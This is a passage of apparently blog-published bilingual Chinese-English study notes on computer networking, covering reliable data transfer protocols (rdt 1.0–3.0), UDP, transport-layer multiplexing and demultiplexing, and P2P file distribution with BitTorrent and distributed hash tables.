协议而言，窗口长度比须小于或等于序号空间大小的一半）</p></li><li><p>靠数据传输机制及其用途的总结</p><table><thead><tr><th>机制</th><th>用途和说明</th></tr></thead><tbody><tr><td>Checksum [first rdt 2.0]</td><td>Used to detect <strong>bit errors</strong> in a transmitted packet</td></tr><tr><td>Acknowledgment [first rdt 2.0]</td><td>Used by the receiver to tell the sender that a packet or set of  packets has been received correctly. Acknowledgments may be  individual or cumulative, depending on the protocol</td></tr><tr><td>Negative acknowledgment [first rdt 2.0]</td><td>Used by the receiver to tell the sender that a packet has not been  received correctly. Carry the sequence number of the packet that  was not received correctly</td></tr><tr><td>Sequence number [first rdt 2.1]</td><td>Used for sequential numbering of packets of data flowing from  sender to receiver. Gaps and duplicate in the sequence numbers of  received packets to detect a lost and duplicate copies of a packet</td></tr><tr><td>Timer [first rdt 3.0]</td><td>Used to timeout/retransmit a packet, possibly because the packet  (or its ACK) was lost within the channel. duplicate copies of a packet  may be received by a receiver</td></tr><tr><td>Window, pipelining [first rdt 3.0+]</td><td>allowing multiple packets to be transmitted but not yet  acknowledged, sender utilization can be increased over a stop-and<br />wait mode of operation.  the window size may be set on the basis of the receiver’s ability to  receive and buffer messages, or the level of congestion in the  network, or both</td></tr></tbody></table></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第三章-运输层（二）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%822/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%822/</url>
    
    <content type="html"><![CDATA[<h1>3.3 Connectionless Transport: UDP，无连接运输∶UDP</h1><ul><li><p>UDP does just about <u>as little as</u> a transport protocol can do. Aside from the <strong>multiplexing/demultiplexing function</strong> and some <strong>light error checking</strong>, it adds nothing to IP</p></li><li><p>Note that with UDP there is no handshaking between sending and receiving transport-layer entities before sending a segment. For this reason, UDP is said to be connectionless</p></li><li><p><strong>DNS</strong> is an example of an application-layer protocol that typically uses UDP</p></li><li><p>许多应用更适合用UDP的原因∶</p><ul><li>finer(更精细) application-level control over what data is sent, and when，关于何时、发送什么数据的应用层控制更为精细<ul><li>TCP has a congestion-control mechanism. ( receipt, need acknowledging, egardless of how long reliable delivery takes)，不适于实时应用</li></ul></li><li>No connection establishment，无需连接建立<ul><li>UDP does not introduce any delay to establish a connection.不会引入建立连接的时延，可能是DNS运行在UDP之上而不是运行在TCP之上的主要原因</li></ul></li><li>No connection state，无连接状态<ul><li>TCP maintains connection state in the end systems（includeing receive and send buffers(接收和发送缓存), congestion-control parameters(拥塞控制参数), and sequence(序号) and acknowledgment number parameters(确认号的参数)），UDP不维护连接状态，也不跟踪这些参数</li><li>For this reason, a server devoted to a particular application can typically <u>support many more active clients</u> when the application runs over UDP rather than TCP，某些专门用于某种特定应用的服务器当应用程序运行在 UDP之上而不是运行在 TCP上时，一般都能支持更多的活跃客户</li></ul></li><li>mall packet header overhead, 分组首部开销小<ul><li>每个TCP报文段都有<strong>20字节</strong>的首部开销，而UDP仅有<strong>8字节</strong>的开销</li></ul></li></ul></li><li><p>流行的因特网应用及其下面的运输协议</p><table><thead><tr><th>应用</th><th>应用层协议</th><th>对应的运输层协议</th></tr></thead><tbody><tr><td>Electronic mail</td><td>SMTP</td><td>TCP</td></tr><tr><td>Remote terminal acces，远程终端访问</td><td>Telnet</td><td>TCP</td></tr><tr><td>Web</td><td>HTTP</td><td>TCP</td></tr><tr><td>File transfer</td><td>FTP</td><td>TCP</td></tr><tr><td>Remote file server，远程文件服务器</td><td>NFS</td><td>Typical UDP</td></tr><tr><td>Streaming multimedia，流式多媒体</td><td>typically proprietary，通常专用</td><td>UDP or TCP</td></tr><tr><td>Internet telephony</td><td>typically proprietary</td><td>UDP or TCP</td></tr><tr><td>Network management，网络管理</td><td>SNMP</td><td>Typical UDP</td></tr><tr><td>Routing protocol，路由选择协议</td><td>RIP</td><td>Typical UDP</td></tr><tr><td>Name translation，名字转换</td><td>DNS</td><td>Typical UDP</td></tr></tbody></table><ul><li>UDP is used for RIP routing table updates</li><li>RIP updates are sent periodically(typically every five minutes),lost updates will be replaced by more recent updates, thus making the lost, out-of-date update useless，更新的丢失能被最近的更新所替代</li><li>UDP is used to carry network management<ul><li>network management applications must often run when the network is in a stressed state，网络管理应用程序通常必须在该网络处于重压状态时运行—precisely when reliable,congestion-controlled data transfer is difficult to achieve</li></ul></li><li>DNS runs over UDP, thereby avoiding TCP’s connection stablishment delays</li></ul></li><li><p>some controversy：</p><ul><li>congestion control is needed to prevent the network from entering a congested state in which very little useful work is done.If everyone were to start streaming high-bitrate video without using any congestion control, there would be so much packet overflow at routers that very few UDP packets would successfully traverse the source-to-destination path</li></ul></li><li><p>It is possible for an application to have reliable data transfer when using UDP. This can be done if reliability is built into the application its</p></li></ul><h3 id="3-3-1-UDP-Segment-Structure">3.3.1 UDP Segment Structure</h3><ul><li><p>The <strong>application data</strong> occupies the <strong>data field</strong> of the UDP segment</p><ul><li>For example, for DNS, the data field contains either a query message or a response message</li><li>For a streaming audio application(流式音频应用),audio samples(音频抽样数据) fill the data field</li></ul></li><li><p>The <strong>UDP header</strong> has only <strong>four fields</strong>, each consisting of <strong>two bytes</strong></p></li><li><p><strong>长度</strong>字段指示了在UDP报文段中的字节数（<strong>首部+数据</strong>）</p></li><li><p>The <strong>checksum</strong>(校验和) is used by the <strong>receiving host</strong> to check whether errors have been introduced into the segment</p><p>（实际上，计算检验和时，除了UDP报文段以外还包括了IP首部的一些字段，现在先忽略）</p></li></ul><h3 id="3-3-2-UDP-Checksum">3.3.2 UDP Checksum</h3><ul><li><p>The UDP checksum provides for error detection，差错检测功能</p><ul><li>the checksum is used to determine(确定) whether bits within the UDP segment have been altered(改变)(for example, by noise in the links or while stored in a router，链路中的噪声干扰或者存储在路由器中时引入问题) as it moved from source to destination</li></ul></li><li><p>校验和=发送方数据相加（有溢出则回卷，即和的末位+1），取反</p><p>接收方将所有数据相加（包括校验和），结果应为全1</p></li><li><p>end-end principle，端到端原则：certain functionality (error detection, in this case)must be implemented on an end-end basis:“functions placed at the lower levels may be redundant or of little value when compared to the cost of providing them at the higher level.”</p><ul><li>there is no guarantee that all the <strong>links</strong> between source and destination provide error checking;</li><li>even if segments are correctly transferred across a link, it’s possible that bit errors could be introduced when a segment is stored in a <strong>router’s memory</strong>.</li></ul></li><li><p>UDP检查错误但不能修复错误，只能丢弃或警告</p></li></ul><h1>3.4 Principles of Reliable Data Transfer，可靠数据传输原理</h1><p>假设是分组将以它们发送的次序进行交付，某些分组可能会丢失;即底层信道将不会对分组重排序</p><ul><li><strong>rdt_send（）</strong><ul><li>通过调用rdt_send（）函数，可以调用数据传输协议的发送方。它将要发送的数据交付给位于接收方的较高层</li><li><strong>rdt</strong></li><li>stands for <strong>reliable data transfer protocol</strong>,表示可靠数据传输协议</li><li><strong>_send</strong><ul><li>indicates that the sending side of rdt is being called, 指示rdt 的发送端正在被调用</li></ul></li></ul></li><li><strong>rdt_rcv()</strong><ul><li>On the receiving side,<strong>rdt_rcv()</strong> will be called when a packet arrives from the receiving side of the channel</li></ul></li><li><strong>deliver_data()</strong><ul><li>When the rdt protocol wants to deliver data to the upper layer, it will do so by calling <strong>deliver_data()</strong></li></ul></li><li><strong>udt_send()</strong><ul><li>Both the send and receive sides of rdt send packets to the other side by a call to udt_send ()</li><li><strong>udt</strong> stands for <strong>unreliable data transfer</strong></li></ul></li></ul><p>In this section we consider only the case of unidirectional data transfer, that is, data transfer from the sending to the receiving side. The case of reliable bidirectional (that is. full-duplex) data transfer is conceptually no more difficult but considerably more tedious to explain</p><p>在本节中仅考虑<strong>单向数据传输</strong>（unidirectional data transfer）的情况，即数据传输是从<strong>发送端到接收端的</strong>，先不考虑可靠的<strong>双向数据传输</strong>（bidirectional data transfer）（即全双工数据传输）</p><p>除了交换含有待传送的数据的分组之外，rdt 的发送端和接收端还需往返交换控制分组</p><h3 id="3-4-1-Building-a-Reliable-Data-Transfer-Protocol，构造可靠数据传输协议">3.4.1 Building a Reliable Data Transfer Protocol，构造可靠数据传输协议</h3><h6 id="Reliable-Data-Transfer-over-a-Perfectly-Reliable-Channel-rdtl-0-经完全可靠信道的可靠数据传输">Reliable Data Transfer over a Perfectly Reliable Channel: rdtl.0,经完全可靠信道的可靠数据传输</h6><ul><li><p>底层信道是完全可靠的</p></li><li><p><strong>finite-state machine(FSM)</strong>：有限状态机</p></li><li><p>引起变迁的事件显示在表示变迁的横线上方</p><p>事件发生时所采取的动作显示在横线下方</p><p>如果对一个事件没有动作，或没有就事件发生而采取了一个动作，我们将在横线上方或下方使用符号ʌ，以分别明确地表示缺少动作或事件</p><p>FSM 的初始状态用虚线表示</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%822/net3.9.jpg" class=""></li></ul><h6 id="Reliable-Data-Transfer-over-a-Channel-with-Bit-Errors-rdt2-0，经具有比特差错信道的可靠数据传输">Reliable Data Transfer over a Channel with Bit Errors: rdt2.0，经具有比特差错信道的可靠数据传输</h6><ul><li><p>Such <strong>bit errors</strong> typically occur in the <strong>physical components</strong>(物理部件) of a network as a packet is transmitted, propagates, or is buffered，传输、传播、缓存</p></li><li><p><code>assume for the moment that all transmitted packets are received(although their bits may be corrupted) in the order in which they were sent</code></p></li><li><p><code>message-dictation protocol uses both positive acknowledgments (肯定确认，&quot;OK&quot;)and negative acknowledgments(否定确认，&quot;Please repeat that.&quot;).</code></p><p>In a computer network setting, <strong>reliable data transfer protocols</strong> based on such <strong>retransmission</strong>(重传) are known as <strong>ARQ</strong>(Automatic Repeat reQuest) protocols，自动重传请求协议</p></li><li><p>ARQ协议中还需要另外三种协议功能来处理存在比特差错的情况∶</p><ul><li>Eror detection，差错检测<ul><li>a mechanism is needed to allow the receiver to detect when bit errors have occurred</li><li>checksum······</li><li>these techniques require that extra bits(beyond the bits of original data to be transferred)be sent from the sender to the receiver; these bits will be gathered into the packet checksum field of the rdt2.0 data packet</li></ul></li><li>Receiver feedback, 接收方反馈<ul><li>rdt2.0 protocol will similarly send <strong>ACK</strong>(肯定确认) and <strong>NAK</strong>(否定确认) packets back from the receiver to the sender</li><li>In principle, these packets need only be one bit long; for example, a <strong>0</strong> value could indicate a <strong>NAK</strong> and a value of <strong>1</strong> could indicate an <strong>ACK</strong></li></ul></li><li>Retransmission，重传<ul><li>a packet that is received in error at the receiver will be retransmitted by the sender</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%822/net3.10.jpg" class=""><ul><li>If a <u>NAK</u> is received, the protocol retransmits <strong>the last packet</strong> and <u>waits</u> for an ACK or NAK to be returned by the receiver in response to the retransmitted data packet</li><li>:star:when the sender is in the <strong>wait-for-ACK-or-NAK state</strong>, it cannot get more data from the upper layer; that is, <u>the rdt_send() event can not occur</u>; that will happen only after the sender <strong>receives an ACK</strong> and <strong>leaves this state</strong></li><li>The receiver-side FSM for rdt2.0 still has a single state. On packet arrival, the receiver replies with either an ACK or a NAK,<u>depending</u> on whether or not the received packet is <strong>corrupt</strong>(受损)</li></ul></li><li><p><strong>stop-and-wait protocols</strong>(停等协议)：the sender will not send a new piece of data until it is sure that the receiver has correctly received the current packet</p></li><li><p>haven’t accounted for the possibility that the <u>ACK or NAK</u> packet could be corrupted</p></li><li><p>处理受损ACK和NAK时的3种可能性∶</p><ul><li>重传</li><li><strong>add enough checksum bits</strong> to allow the sender not only to detect(察觉，检查错误), but also to recover from bit error，修复. This solves the immediate problem for a channel that can corrupt packets but not lose them.产生错误但不会丢失分组的信道</li><li>the third approach is for the sender simply to <strong>resend</strong> the <strong>current data packet</strong> when it receives a garbled ACK or NAK packet<ul><li>however, introduces <strong>duplicate packets</strong>(冗余分组) into the sender-to-receiver channel</li><li>The fundamental difficulty with duplicate packets is that the receiver doesn’t know whether the ACK or NAK it last sent was received correctly at the sender. Thus, it cannot know a priori whether an arriving packet contains new data or is a retransmission!</li></ul></li></ul></li><li><p>（solution，几乎所有现有的数据传输协议都采用的）add a new field to the data packet and have the sender number its data packets by putting a <strong>sequence number</strong>(序号) into this field</p></li><li><p>For this simple case of a stop-and-wait protocol, a 1-bit sequence number will suffice</p></li><li><p>:small_blue_diamond:rdt2.1的FSM描述</p><ul><li>the rdt2.1 sender and receiver FSMs each now have twice as many states as before</li><li>When an <strong>out-of-order packet</strong> is received, the receiver sends a <strong>positive acknowledgment</strong> for the packet it has received. When a <strong>corrupted packet</strong> is received, the receiver sends a <strong>negative acknowledgment</strong></li></ul></li><li><p>:small_blue_diamond:rdt2.2的FSM描述</p></li></ul><p>rd2.1和 rd2.2之间的细微变化在于，接收方此时必须包括由一个 ACK报文所确认的分组序号（这可以通过在接收方 FSM中，在make_pkt（）中包括参数 ACK 0或 ACK 1 来实现），发送方此时必须检查接收到的 ACK 报文中被确认的分组序号（这可通过在发送方FSM中，在 isACK（）中包括参数0或1来实现）</p><h6 id="Reliable-Data-Transfer-over-a-Lossy-Channel-with-Bit-Errors-rdt3-0，具有比特差错的丢包信道的可靠数据传输∶-rdt-3-0">Reliable Data Transfer over a Lossy Channel with Bit Errors:rdt3.0，具有比特差错的丢包信道的可靠数据传输∶ rdt 3.0</h6><ul><li><p>Suppose now that in addition to corrupting bits, the underlying channel can lose，丢包</p><p>( how to detect packet loss and what to do when packet loss occurs?)</p></li><li><p>Implementing(实现) a <strong>time-based retransmission mechanism</strong> requires a <strong>countdown timer</strong>(倒计数定时器) that can <strong>interrupt the sender</strong> after a given amount of time has expired，在一定的时间量过期后</p></li><li><p>The sender will need to be able to：</p><ul><li>start the timer each time a packet (either a first-time packet or a retransmission)is sent</li><li>respond to a timer interrupt (taking appropriate actions)</li><li>stop the timer</li></ul></li><li><p>Because packet sequence numbers alternate between 0 and 1, protocol rdt3.0 is sometimes known as the <strong>alternating-bit protocol</strong>(比特交替协议)</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第三章-运输层（一）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%821/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%821/</url>
    
    <content type="html"><![CDATA[<h1>3.1 Introduction and Transport-Layer Services</h1><ul><li><p>A <strong>transport-layer</strong> protocol provides for <strong>logical communication</strong>(逻辑通信) between <u>application processes</u> running on different hosts</p></li><li><p>By logical communication，from an application’s perspective，it is as if the hosts running the processes were directly connected</p></li><li><p><strong>transport-layer protocols</strong> are implemented(实现) in the <strong>end systems</strong> but <u>not</u> in <strong>network routers</strong></p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%821/3.01.jpg" class=""></li><li><p>:star:It’s important to note that <strong>network routers</strong> act <u>only</u> on the <strong>network-layer fields</strong> of the datagram; that is, they do not examine(检查) the fields of the <strong>transport-layer</strong> segment encapsulated with the datagram，网络路由器仅作用于该数据报的网络层字段；即它们不检查封装在该数据报的运输层报文段的字段</p></li><li><p>More than one transport-layer protocol may be available to network applications.网络应用程序可以使用多种的运输层协议</p><ul><li>the Internet has two protocols—TCP and UDP. Each of these protocols provides a different set of transport-layer services to the invoking application(调用的应用程序)</li></ul></li></ul><h1>3.1.1 Relationship Between Transport and Network Layers</h1><ul><li><p><strong>Transport-layer protocol</strong> provides <u>logical communication</u> between <strong>processes</strong> running on different hosts, a <strong>network-layer protocol</strong> provides <u>logical communication</u>  between <strong>hosts</strong></p></li><li><p>类比</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%821/3.03.jpg" class=""><ul><li><p><code>应用层报文 = 信封上的字符 </code></p><p><code>进程 = 堂兄弟姐妹 </code></p><p><code>主机（又称为端系统）= 家庭 </code></p><p><code>运输层协议 = Ann 和 Bill </code></p><p><code>网络层协议 = 邮政服务（包括邮车）</code></p></li><li><p><code>Ann 和 Bill都是在各自家里进行工作的;例如，他们并没有参与任何一个中间邮件中心对邮件进行分拣，或者将邮件从一个邮件中心送到另一个邮件中心之类的工作</code></p><p>transport-layer protocols live in the end system,运输层协议只工作在端系统中</p><ul><li>Within an end system, a transport protocol moves messages from <u>application</u> processes to the <u>network edge</u>(that is, the network layer), but it doesn’t have any say about how the messages are moved within the <u>network core</u></li><li>Intermediate <u>routers</u> neither act on, nor recognize,any information that the transport layer may have added to the application messages</li></ul></li><li><p><code>little Susan 和Harvey接替他们的工作，收发邮件的次数少，而且偶尔还会丢失邮件。因此，Susan 和Harvey 这对堂兄妹并没有提供与Ann 和 Bill一样的服务集合（即相同的服务模型）</code></p><p>a computer network may make available multiple transport proocols, with each protocol offering a different service model to applications，计算机网络中可以安排多种运输层协议，每种协议为应用程序提供不同的服务模型</p></li><li><p><code>Ann 和 Bill 所能提供的服务明显受制于邮政服务所能提供的服务。例如，如果邮政服务不能提供在两家之间传递邮件所需时间的最长期限（例如3天），那么 Ann 和 Bill 就不可能保证邮件在堂兄弟姐妹之间传递信件的最长期限</code></p><p>the services that a transport protocol can provide are often constrained(约束，限制) by the service model of the underlying network-layer protocol</p><ul><li>If the network-layer protocol cannot provide delay or bandwidth guarantees(时延或带宽保证) for transportlayer segments sent between hosts, then the transport-layer protocol cannot provide delay or bandwidth guarantees for application messages sent between processes</li></ul></li></ul></li><li><p>certain services can be offered by a transport protocol even when the underlying network protocol doesn’t offer the corresponding(相应的，相关的) service at the network layer</p><ul><li>a <u>transport protocol</u> can offer <strong>reliable data transfer service</strong> to an application even when the underlying <u>network protocol is unreliable</u>, that is, even when the network protocol loses, garbles(篡改), or duplicates(冗余) packets</li><li>a transport protocol can use <u>encryption</u> to guarantee that application messages are not read by intruders, even when the network layer cannot guarantee the confidentiality(机密性) of transport-layer segments</li></ul></li></ul><h1>3.1.2 Overview of the Transport Layer in the Internet</h1><h6 id="brief-introduction-of-UDP-and-TCP">brief introduction of UDP and TCP</h6><ul><li>IP，the Internet’s network-laver protocol (网际协议)<ul><li>IP provides logical communication between hosts</li><li>the IP service model is a <strong>best-effort delivery service</strong>(尽力而为交付服务)</li><li>but it makes no guarantees(segment delivery, <u>orderly</u> delivery of segments, integrity(完整性) of the data in the segments)----&gt; <strong>unreliable service</strong></li><li>every host has <strong>at least</strong> one network-layer address, a so-called IP address</li></ul></li></ul><h6 id="summarize-the-service-models-provided-by-UDP-and-TCP">summarize the service models provided by UDP and TCP</h6><ul><li>UDP和TCP最基本的责任是to <u>extend</u> IP’s delivery service between two end systems to a delivery service between two processes running on the <strong>end systems</strong></li><li><strong>Extending host-to-host delivery to process-to-process delivery</strong> is called <strong>transport-laver multiplexing</strong>(运输层的多路复用) and <strong>demultiplexing</strong>(多路分解)</li><li>UDP and TCP also provide <u>integrity checking</u>(完整性检查) by including <strong>errordetection fields</strong>(差错检香字段) in their segments’ headers(报文段首部)</li><li>These two <strong>minimal transport-laver services</strong>(最低限度的运输层服务)—<strong>process-to-process data delivery</strong>(进程到进程的数据交付) and <strong>error checking</strong>(错误检查)—are the <u>only</u> two services that <u>UDP</u> provides</li><li>TCP为应用程序提供了几种附加服务<ul><li>reliable data transfer，可靠数据传输</li><li>Using <strong>flow control</strong>(流量控制), <strong>sequence numbers</strong>(序号), <strong>acknowledgments</strong>(确认), and <strong>timers</strong>(定时器)，TCP ensures delivery <u>correctly</u> and <u>in order</u></li><li>congestion control，拥塞控制<ul><li>TCP congestion control prevents any one TCP connection from swamping(淹没) the links and routers between communicating hosts with an excessive amount of traffic，防止任何一条 TCP连接用过多流量来淹没通信主机之间的链路和交换设备</li><li>TCP strives to give each connection （traversing a congested link） an equal share of the link bandwidth</li><li>An application using UDP transport can send at any rate it pleases, for as long as it pleases</li></ul></li></ul></li></ul><h1>3.2 Multiplexing and Demultiplexing</h1><ul><li><p>a multiplexing/demultiplexing service is needed for <u>all</u> computer networks</p></li><li><p><strong>demultiplexing</strong>(多路分解)：the job of <u>delivering</u> the data in a <u>transport-layer segment</u> to the <strong>correct socket</strong>,将运输层报文段中的数据交付到正确的套接字</p></li><li><p><strong>multiplexing</strong>(多路复用)：The job of <u>gathering data chunks</u> at the source host from different sockets, encapsulating(封装) each data chunk with <strong>header information</strong>(首部信息)(that will later be used in demultiplexing)to <u>create segments</u>,and passing the segments to the network layer，在源主机从不同套接字中收集数据块，并为每个数据块封装上首部信息（这将在以后用于分解）从而生成报文段，然后将报文段传递到网络层</p></li><li><p><code>Bill从邮递员处收到一批信件，并通过香看收信人名字而将信件亲手交付给他的兄弟姐妹们</code></p><p>=&gt;分解</p><p><code>Ann 从兄弟姐妹们那里收集信件并将它们交给邮递员</code></p><p>=&gt;多路复用</p></li><li><p>运输层多路复用要求：</p><ul><li><p><u>sockets</u> have <strong>unique identifiers</strong></p></li><li><p><u>each segment</u> have <strong>special fields</strong> that indicate the socket to which the segment is to be delivered，每个报文段有特殊字段来指示该报文段所要交付到的套接字</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%821/net3.3.jpg" class=""><ul><li><strong>source port number field</strong>：源端口号字段</li><li><strong>destination port number field</strong>：目的端口号字段</li><li>Each port number is a <strong>16-bit</strong> number, ranging from <strong>0 to 65535</strong></li><li>The port numbers ranging from <strong>0 to 1023</strong> are called <strong>well-known port numbers</strong>(周知端口号) and are restricted(受限制的), which means that they are reserved for use by well-known application protocols such as HTTP(which uses port number 80) and FTP (which uses port number 21)</li><li>we must assign the application a port number when developing a new application</li></ul></li></ul></li><li><p>how the transport layer could implement the demultiplexing service：</p></li><li><p>Each socket in the host could be assigned a port number</p></li><li><p>when a segent arrives at the host, the transport layer examines(检查) the destination port number in the segment and directs the segment to the corresponding socket</p></li><li><p>The segment’s data then passes through the socket into the attached process</p></li><li><p>（this is basically how UDP does it. TCP is yet more subtle(复杂)）</p></li></ul><h3 id="onnectionless-Multiplexing-and-Demultiplexing，无连接的多路复用与多路分解">onnectionless Multiplexing and Demultiplexing，无连接的多路复用与多路分解</h3><ul><li><p>创建了一个UDP套接字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">clientSocket = socket(socket.AF INET, socket.SOCK_DGRAM)<br></code></pre></td></tr></table></figure><ul><li>运输层自动地为该套接字分配一个端口号。特别是，运输层从范围1024～65535内分配一个端口号，该端口号是当前未被该主机中任何其他UDP端口使用的号</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">clientSocket.<span class="hljs-built_in">bind</span>((&#x27;&#x27;,<span class="hljs-number">19157</span>))<br></code></pre></td></tr></table></figure><ul><li>通过套接字bind() 方法为这个UDP套接字关联一个特定的端口号</li></ul></li><li><p>Host B could be running multiple processes, each with its own UDP socket and associated port number. As UDP segments arrive from the network, Host B directs (demultiplexes) each segment to the appropriate socket by examining the segment’s destination port number</p><p>UDP只通过目的端口号区分不同的进程</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%821/net3-12.jpg" class=""></li><li><p>A UDP socket is fully identified by a <strong>two-tuple consisting</strong> of a <strong>destination IP address</strong> and a <strong>destination port number</strong>，一个UDP套接字是由一个二元组来全面标识的</p></li><li><p>if two UDP segments have different source IP addresses and/or source port numbers, but have the same destination IP address and destination port number, then the two segments will be directed to the same destination process <u>via the same destination socket</u>，不同源同目的===&gt;通过相同的套接字定向到相同进程</p></li><li><p>the A-to-B segment the source port number serves as part of a&quot;<strong>return address</strong>&quot;(返回地址)—when B wants to send a segment back to A</p></li></ul><h3 id="Connection-Oriented-Multiplexing-and-Demultiplexing，面向连接的多路复用与多路分解">Connection-Oriented Multiplexing and Demultiplexing，面向连接的多路复用与多路分解</h3><ul><li><p>TCP socket is identified by a four-tuple（different from UDP）</p><ul><li>source IP address</li><li>source port number</li><li>destination IP address</li><li>destination port number</li></ul></li><li><p>when a TCP segment arrives from the network to a host, the host uses <strong>all four values</strong> to direct(demultiplex，分解)the segment to the appropriate socket</p></li><li><p>In contrast with UDP, two arriving TCP segments with <strong>different source IP addresses</strong> <u>or</u> <strong>source port numbers</strong> will<code>(with the exception of a TCP segment carrying the original connection-establishment request,除非TCP报文段携带了初始创建连接的请求)</code>be directed to <strong>two different sockets</strong></p></li></ul><h3 id="Web-Servers-and-TCP，Web-服务器与TCP">Web Servers and TCP，Web 服务器与TCP</h3><ul><li><p>there is not always a one-to-one correspondence between connection sockets and processes. In fact, today’s high-performing Web servers often use only one process, and create a new thread with a new connection socket for each new client connection.(A thread can be viewed as a lightweight subprocess.)高性能Web服务器通常只使用一个进程，但是为每个新的客户连接创建一个具有新连接套接字的新线程（线程可被看作是一个轻量级的子进程）</p></li><li><p>If the client and server are using <strong>persistent HTTP</strong>, then throughout the duration of the persistent connection the client and server exchange HTTP messages via the same server socket. 客户与服务器之间经由同一个服务器套接字交换 HTTP报文</p></li><li><p>If the client and server use <strong>non-persistent HTTP</strong>, then a new TCP connection is created and closed for every request/response, and hence a new socket is created and later closed for every request/response，每一对请求/响应都创建一个新的TCP连接并在随后关闭，因此对每一对请求/响应创建一个新的套接字并在随后关闭（会影响性能）</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第二章-应用层（四）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%824/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%824/</url>
    
    <content type="html"><![CDATA[<h1>2.6 Peer-to-Peer Applications，P2P应用</h1><ul><li>适合于P2P设计的应用<ul><li>file distribution</li><li>a database distributed over a large community of peers，分布在大型对等方社区中的数据库</li><li>Skype,a phenomenally successful P2PInternet telephny application</li></ul></li></ul><h3 id="2-6-1-P2P-File-Distribution，P2P文件分发">2.6.1 P2P File Distribution，P2P文件分发</h3><h6 id="Scalability-扩展性-of-P2P-Architectures">Scalability(扩展性) of P2P Architectures</h6><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%824/net2.24.jpg" class=""><p><strong>distribution time</strong>(分发时间) ：the time it takes to get a copy of the file to <strong>all</strong> N peers，是所有N个对等方得到该文件的副本所需要的时间</p><h6 id="BitTorrent">BitTorrent</h6><ul><li>a P2P protocol for file distribution</li><li>the collection of all peers participating in the distribution of a particular file is called a torren(洪流)，参与一个特定文件分发的所有对等方的集合被称为一个洪流（torrent）</li><li>Peers in a torrent download <strong>equal-size</strong> <u>chunks</u>(文件块) of the file from one another, with a typical chunk size of 256 KBytes</li><li>Each torrent has an infrastructure node called a <strong>tracker</strong>(追踪器)</li><li>When a peer joins a torrent, it <u>registers</u> itself with the tracker and periodically(周期性地) <u>informs</u> the tracker that it is still in the torrent(In this manner, the tracker keeps track of the peers that are participating in the torrent)</li><li>Periodically, Alice will ask <u>each</u> of her neighboring peers (over the <strong>TCP</strong> connections) for the <u>list</u> of that <u>chunks</u> they have. If Alice has <u>L</u> different neighbors,she will obtain <u>L</u> lists of chunks.With this knowledge,Alice will issue requests(again over the <strong>TCP</strong> connections) for chunks she currently does not have</li><li>In deciding which chunks to <u>request</u>,a technique called <strong>rarest first</strong>(最稀缺优先)<ul><li>In this manner, the rarest chunks get more quickly redistributed, aiming to (roughly)equalize(均衡，平衡) the numbers of copies of each chunk in the torrent</li></ul></li><li>To determine which requests she <u>responds</u> to, BitTorrent uses a clever trading algorithm(对换算法)<ul><li>gives <strong>priority</strong> to the neighbors that are currently supplying her data at the <strong>highest rate</strong></li><li><u>measures</u> the rate at which she receives bits and determines the <u><strong>four</strong> peers</u>(are said to be <strong>unchoked</strong>，疏通) that are feeding her bits at the highest rate</li><li>every <strong>10 seconds</strong>,<u>recalculates</u> the rates and possibly <u>modifies</u> the set of four peers</li><li>every <strong>30 seconds</strong>, Alice also picks one additional neighbor(Bob) at <u>random</u> and sends it chunks(Bob is said to be <strong>optimistically unchoked</strong>)</li></ul></li><li>sending chunks: tit-for-tat(“以牙还牙”) 一个以善意合作为出发点的博弈策略</li></ul><h3 id="2-6-2-Distributed-Hash-Tables-DHTs-，分散式散列表">2.6.2 Distributed Hash Tables (DHTs)，分散式散列表</h3><ul><li>A critical component(关键部件) of many P2P applications and other <u>distributed applications</u>is an <strong>index</strong>(that is, <strong>a simple database</strong>),supporting <strong>search</strong> and <strong>update</strong> operations</li><li>When this database is distributed, the peers may perform <strong>content caching</strong>(内容缓存) and <strong>sophisticated routing of queries</strong>(复杂的查询路由) among themselves</li><li>DHTs：a popular indexing and searching technique</li><li>assign an identifier to each peer, where each identifier is an integer in the range [0,2&quot;-1] for some fixed n. Note that each such identifier can be expressed by an n-bit representation. each key to be an integer in the same range,求每个键是同一范围内的一个整数</li><li>A <strong>hash function</strong> is a <strong>many-to-one</strong> function for which two different inputs can have the same output (same integer),but the likelihood of the having the same output is extremely small,使两个不同的输入能够具有相同的输出（相同的整数），但是具有相同输出的似然性极低</li><li><strong>the immediate successor of the key</strong>(键的最直接后继): the closest peer</li><li>closest：if the key is exactly equal to one of the peer identifiers, we store the 